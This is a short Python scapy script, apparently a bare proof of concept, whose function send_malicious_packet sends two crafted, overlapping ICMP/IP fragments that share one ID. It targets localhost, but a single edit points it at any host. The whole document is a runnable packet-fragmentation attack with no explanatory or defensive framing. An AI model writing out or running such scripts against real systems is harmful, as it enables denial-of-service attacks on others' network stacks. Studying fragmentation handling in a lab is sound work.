from scapy.all import *

def send_malicious_packet():
    # Create fragmented ICMP packets
    pkt1 = IP(dst="127.0.0.1", id=1111, flags="MF") / ICMP() / ("X" * 600)
    pkt2 = IP(dst="127.0.0.1", id=1111, frag=1) / ("X" * 600)

    print("Sending fragmented ICMP packets...")
    send(pkt1)
    send(pkt2)

if __name__ == "__main__":
    send_malicious_packet()
